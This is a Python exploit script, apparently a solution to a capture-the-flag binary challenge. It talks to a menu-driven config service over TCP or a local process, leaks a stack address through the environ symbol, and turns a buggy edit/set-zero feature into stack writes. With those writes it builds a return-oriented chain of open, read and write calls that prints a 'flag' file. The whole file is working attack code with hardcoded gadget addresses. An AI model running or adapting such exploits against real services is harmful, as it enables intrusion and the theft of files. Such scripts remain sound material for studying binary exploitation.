#!/usr/bin/env python3
import argparse
import os
import select
import socket
import struct
import subprocess
import sys
import time


POP_RDI = 0x00000000004029CF
RET = 0x000000000040101A
POP_RSI = 0x000000000040AA3E
POP_RDX_RBX = 0x00000000004AA50B
OPEN = 0x000000000045F090
READ = 0x000000000045F1C0
WRITE = 0x000000000045F260
ENVIRON = 0x00000000004F32D0


def p64(value: int) -> bytes:
    return struct.pack("<Q", value & 0xFFFFFFFFFFFFFFFF)


class Tube:
    def __init__(self, host: str, port: int, timeout: float) -> None:
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(timeout)
        self.buf = bytearray()

    def close(self) -> None:
        try:
            self.sock.close()
        except OSError:
            pass

    def _fill(self) -> None:
        chunk = self.sock.recv(4096)
        if not chunk:
            raise EOFError("connection closed")
        self.buf.extend(chunk)

    def recvuntil(self, token: bytes) -> bytes:
        while True:
            idx = self.buf.find(token)
            if idx != -1:
                end = idx + len(token)
                data = bytes(self.buf[:end])
                del self.buf[:end]
                return data
            self._fill()

    def recvn(self, size: int) -> bytes:
        while len(self.buf) < size:
            self._fill()
        data = bytes(self.buf[:size])
        del self.buf[:size]
        return data

    def sendline(self, data: bytes) -> None:
        self.sock.sendall(data + b"\n")

    def recvall(self, idle_timeout: float = 0.5, hard_timeout: float = 5.0) -> bytes:
        end = time.time() + hard_timeout
        chunks = [bytes(self.buf)]
        self.buf.clear()
        while time.time() < end:
            try:
                self.sock.settimeout(idle_timeout)
                chunk = self.sock.recv(4096)
            except socket.timeout:
                break
            except OSError:
                break
            if not chunk:
                break
            chunks.append(chunk)
        return b"".join(chunks)


class ProcessTube:
    def __init__(self, argv, timeout: float) -> None:
        self.proc = subprocess.Popen(
            argv,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
        self.timeout = timeout
        self.buf = bytearray()

    def close(self) -> None:
        if self.proc.stdin:
            try:
                self.proc.stdin.close()
            except OSError:
                pass
        if self.proc.poll() is None:
            self.proc.kill()
            self.proc.wait(timeout=1)

    def _fill(self) -> None:
        if self.proc.stdout is None:
            raise EOFError("stdout closed")
        ready, _, _ = select.select([self.proc.stdout], [], [], self.timeout)
        if not ready:
            raise TimeoutError("process read timed out")
        chunk = os.read(self.proc.stdout.fileno(), 4096)
        if not chunk:
            raise EOFError("process closed")
        self.buf.extend(chunk)

    def recvuntil(self, token: bytes) -> bytes:
        while True:
            idx = self.buf.find(token)
            if idx != -1:
                end = idx + len(token)
                data = bytes(self.buf[:end])
                del self.buf[:end]
                return data
            self._fill()

    def recvn(self, size: int) -> bytes:
        while len(self.buf) < size:
            self._fill()
        data = bytes(self.buf[:size])
        del self.buf[:size]
        return data

    def sendline(self, data: bytes) -> None:
        if self.proc.stdin is None:
            raise EOFError("stdin closed")
        self.proc.stdin.write(data + b"\n")
        self.proc.stdin.flush()

    def recvall(self, idle_timeout: float = 0.5, hard_timeout: float = 5.0) -> bytes:
        if self.proc.stdout is None:
            return b""
        end = time.time() + hard_timeout
        chunks = [bytes(self.buf)]
        self.buf.clear()
        while time.time() < end:
            ready, _, _ = select.select([self.proc.stdout], [], [], idle_timeout)
            if not ready:
                break
            chunk = os.read(self.proc.stdout.fileno(), 4096)
            if not chunk:
                break
            chunks.append(chunk)
        return b"".join(chunks)


class Exploit:
    def __init__(self, tube: Tube) -> None:
        self.io = tube

    def cmd(self, choice: int) -> None:
        self.io.recvuntil(b"Choice: ")
        self.io.sendline(str(choice).encode())

    def edit(self, content: bytes, off: int = 304) -> None:
        self.cmd(1)
        self.io.recvuntil(b"enter new config data: ")
        self.io.sendline(content)
        self.io.recvuntil(b"Do you want to backup to heap? (y/n): ")
        self.io.sendline(b"y")
        if len(content) < 0x100:
            self.io.recvuntil(b"what off do you want")
            self.io.sendline(str(off).encode())

    def exchange(self) -> None:
        self.cmd(4)
        self.io.recvuntil(b"give you a choice to set zero")
        self.io.sendline(b"n")

    def set_zero(self, index: int = -1) -> None:
        self.cmd(4)
        self.io.recvuntil(b"give you a choice to set zero")
        self.io.sendline(b"y")
        self.io.sendline(str(index).encode())

    def leak_stack(self) -> int:
        self.edit(p64(ENVIRON))
        self.cmd(2)
        self.io.recvuntil(b"--- File Content ---\n")
        leak = struct.unpack("<Q", self.io.recvn(8))[0]
        self.io.recvuntil(b"--------------------\n")
        return leak - 0x1F8

    def write_slot(self, offset: int, value: int) -> None:
        payload = b"a" * (0xC8 - offset + 0x28) + p64(value)
        self.edit(payload)
        self.set_zero()

    def run(self) -> bytes:
        stack = self.leak_stack()

        self.edit(b"a" * 0xF8 + b"@" * 8 + p64(stack))
        self.exchange()

        self.edit(b"a" * 0xC8 + b"@" * 8 + b"////flag")
        self.set_zero(0)
        self.edit(b"a" * 0xC8 + b"@" * 8 + b"////flag")
        self.set_zero(-2)

        self.edit(b"a" * 0xC0 + b"@" * 8 + p64(WRITE))
        self.set_zero(-1)
        self.edit(b"a" * 0xB8 + p64(WRITE))
        self.set_zero(-1)

        self.write_slot(0x30, 0)
        self.write_slot(0x38, 0x20)
        self.write_slot(0x40, POP_RDX_RBX)
        self.write_slot(0x48, stack + 0xA00)
        self.write_slot(0x50, POP_RSI)
        self.write_slot(0x58, 1)
        self.write_slot(0x60, POP_RDI)
        self.write_slot(0x68, READ)
        self.write_slot(0x70, 0)
        self.write_slot(0x78, 0x20)
        self.write_slot(0x80, POP_RDX_RBX)
        self.write_slot(0x88, stack + 0xA00)
        self.write_slot(0x90, POP_RSI)
        self.write_slot(0x98, 3)
        self.write_slot(0xA0, POP_RDI)
        self.write_slot(0xA8, OPEN)
        self.write_slot(0xB0, 0)
        self.write_slot(0xB8, 0)
        self.write_slot(0xC0, POP_RDX_RBX)
        self.write_slot(0xC8, 0)
        self.write_slot(0xD0, POP_RSI)
        self.write_slot(0xD8, stack + 0xC8 + 8)

        self.edit(b"a" * 0x10 + p64(POP_RDI))
        self.set_zero(-1)
        self.edit(b"a" * 0x8 + p64(RET))
        self.exchange()

        self.cmd(5)
        return self.io.recvall()


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8000)
    parser.add_argument("--local-bin")
    parser.add_argument("--expect")
    parser.add_argument("--timeout", type=float, default=5.0)
    args = parser.parse_args()

    if args.local_bin:
        tube = ProcessTube([args.local_bin], args.timeout)
    else:
        tube = Tube(args.host, args.port, args.timeout)
    try:
        output = Exploit(tube).run()
    finally:
        tube.close()

    sys.stdout.buffer.write(output)
    sys.stdout.flush()

    if args.expect and args.expect.encode() not in output:
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
